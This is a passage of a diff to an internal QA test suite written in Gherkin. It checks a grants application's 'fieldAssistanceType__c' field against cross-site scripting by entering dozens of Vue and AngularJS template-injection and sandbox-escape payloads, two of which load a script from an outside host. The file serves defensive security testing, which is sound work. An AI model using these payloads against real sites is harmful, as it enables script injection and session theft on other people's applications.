       | <x v-if=_c.constructor('alert(1)')()> | fieldAssistanceType__c |
@@ -12955,7 +12955,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                  |
       | {{_c.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -12980,7 +12980,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                  |
       | {{_v.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -13005,7 +13005,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                  |
       | {{_s.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -13030,7 +13030,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                  |
       | <p v-show="_c.constructor`alert(1)`()"> | fieldAssistanceType__c |
@@ -13055,7 +13055,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                  |
       | <x v-on:click='_b.constructor`alert(1)`()'>click</x> | fieldAssistanceType__c |
@@ -13080,7 +13080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                  |
       | <x v-bind:a='_b.constructor`alert(1)`()'> | fieldAssistanceType__c |
@@ -13105,7 +13105,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | <x @[_b.constructor`alert(1)`()]> | fieldAssistanceType__c |
@@ -13130,7 +13130,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | <x :[_b.constructor`alert(1)`()]> | fieldAssistanceType__c |
@@ -13155,7 +13155,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | <p v-=_c.constructor`alert(1)`()> | fieldAssistanceType__c |
@@ -13180,7 +13180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | <x #[_c.constructor`alert(1)`()]> | fieldAssistanceType__c |
@@ -13205,7 +13205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                  |
       | <p :=_c.constructor`alert(1)`()> | fieldAssistanceType__c |
@@ -13230,7 +13230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                            | Field                  |
       | {{_c.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -13255,7 +13255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                  |
       | {{_b.constructor`alert(1)`()}} | fieldAssistanceType__c |
@@ -13280,7 +13280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                    | Field                  |
       | <x v-bind:is="'script'" src="//14.rs" /> | fieldAssistanceType__c |
@@ -13305,7 +13305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                   | Field                  |
       | <x is=script src=//⑭.₨> | fieldAssistanceType__c |
@@ -13330,7 +13330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                  |
       | <x @click='_b.constructor`alert(1)`()'>click</x> | fieldAssistanceType__c |
@@ -13355,7 +13355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | <x @[_b.constructor`alert(1)`()]> | fieldAssistanceType__c |
@@ -13380,7 +13380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | <x :[_b.constructor`alert(1)`()]> | fieldAssistanceType__c |
@@ -13405,7 +13405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | <x #[_c.constructor`alert(1)`()]> | fieldAssistanceType__c |
@@ -13430,7 +13430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                  |
       | <x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;"> | fieldAssistanceType__c |
@@ -13455,7 +13455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                  |
       | <x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"> | fieldAssistanceType__c |
@@ -13480,7 +13480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                           | Field                  |
       | <xyz<img/src onerror=alert(1)>> | fieldAssistanceType__c |
@@ -13505,7 +13505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                | Field                  |
       | <svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg> | fieldAssistanceType__c |
@@ -13530,7 +13530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                  |
       | <a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a> | fieldAssistanceType__c |
@@ -13555,7 +13555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                  |
       | {{$el.ownerDocument.defaultView.alert(1)}} | fieldAssistanceType__c |
@@ -13580,7 +13580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                  |
       | {{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}} | fieldAssistanceType__c |
@@ -13605,7 +13605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                  |
       | <img src @error=e=$event.path.pop().alert(1)> | fieldAssistanceType__c |
@@ -13630,7 +13630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                  |
       | <img src @error=e=$event.composedPath().pop().alert(1)> | fieldAssistanceType__c |
@@ -13655,7 +13655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                  |
       | <img src @error=this.alert(1)> | fieldAssistanceType__c |
@@ -13680,7 +13680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                    | Field                  |
       | <svg@load=this.alert(1)> | fieldAssistanceType__c |
@@ -13705,7 +13705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                  |
       | <p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//"> | fieldAssistanceType__c |
@@ -13730,7 +13730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                    | Field                  |
       | {{_openBlock.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -13755,7 +13755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                  |
       | {{_createBlock.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -13780,7 +13780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                          | Field                  |
       | {{_toDisplayString.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -13805,7 +13805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                  |
       | {{_createVNode.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -13830,7 +13830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                           | Field                  |
       | <p v-show=_createBlock.constructor`alert(1)`()> | fieldAssistanceType__c |
@@ -13855,7 +13855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                  |
       | <x @[_openBlock.constructor`alert(1)`()]> | fieldAssistanceType__c |
@@ -13880,7 +13880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                  |
       | <x @[_capitalize.constructor`alert(1)`()]> | fieldAssistanceType__c |
@@ -13905,7 +13905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                  |
       | <x @click=_withCtx.constructor`alert(1)`()>click</x> | fieldAssistanceType__c |
@@ -13930,7 +13930,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                  |
       | <x click=$event.view.alert(1)>click</x> | fieldAssistanceType__c |
@@ -13955,7 +13955,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                              | Field                  |
       | {{_Vue.h.constructor`alert(1)`()}} | fieldAssistanceType__c |
@@ -13980,7 +13980,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | {{$emit.constructor`alert(1)`()}} | fieldAssistanceType__c |
@@ -14005,7 +14005,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                  |
       | <teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport> | fieldAssistanceType__c |
@@ -14030,7 +14030,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                               | Field                  |
       | <component is=script text=alert(1)> | fieldAssistanceType__c |
@@ -14055,7 +14055,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                  |
       | {{constructor.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -14080,7 +14080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | {{$on.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -14105,7 +14105,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                      | Field                  |
       | {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}} | fieldAssistanceType__c |
@@ -14130,7 +14130,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                   | Field                  |
       | {{{}.")));alert(1)//"}} | fieldAssistanceType__c |
@@ -14155,7 +14155,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                      | Field                  |
       | {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}} | fieldAssistanceType__c |
@@ -14180,7 +14180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                        | Field                  |
       | {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}} | fieldAssistanceType__c |
@@ -14205,7 +14205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                   | Field                  |
       | {{{}.")));alert(1)//"}} | fieldAssistanceType__c |
@@ -14230,7 +14230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                | Field                  |
       | {{!ready && (ready = true) && (!call? $$watchers[0].get(toString.constructor.prototype): (a = apply) &&(apply = constructor) &&(valueOf = call) &&(''+''.toString('F = Function.prototype;' +'F.apply = F.a;' +'delete F.a;' +'delete F.valueOf;' +'alert(1);')));}} | fieldAssistanceType__c |
@@ -14255,7 +14255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                            | Field                  |
       | {{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}} | fieldAssistanceType__c |
@@ -14280,7 +14280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                  | Field                  |
       | {{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}} | fieldAssistanceType__c |
@@ -14305,7 +14305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                             | Field                  |
       | {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} | fieldAssistanceType__c |
@@ -14330,7 +14330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                      | Field                  |
       | {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} | fieldAssistanceType__c |
@@ -14355,7 +14355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                           | Field                  |
       | {{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}} | fieldAssistanceType__c |
@@ -14380,7 +14380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | Field                  |
       | {{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}} | fieldAssistanceType__c |
@@ -14405,7 +14405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                                                                                  | Field                  |
       | {{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}} | fieldAssistanceType__c |
@@ -14430,7 +14430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                  |
       | {{constructor.constructor('alert(1)')()}} | fieldAssistanceType__c |
@@ -14455,7 +14455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                              | Field                  |
       | {{$on.constructor('alert(1)')()}}} | fieldAssistanceType__c |
@@ -14480,7 +14480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                  |
       | constructor.constructor('alert(1)')() | fieldAssistanceType__c |
@@ -14505,7 +14505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                  | Field                  |
       | a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() | fieldAssistanceType__c |
@@ -14530,7 +14530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                   | Field                  |
       | toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor) | fieldAssistanceType__c |
@@ -14555,7 +14555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                                                                         | Field                  |
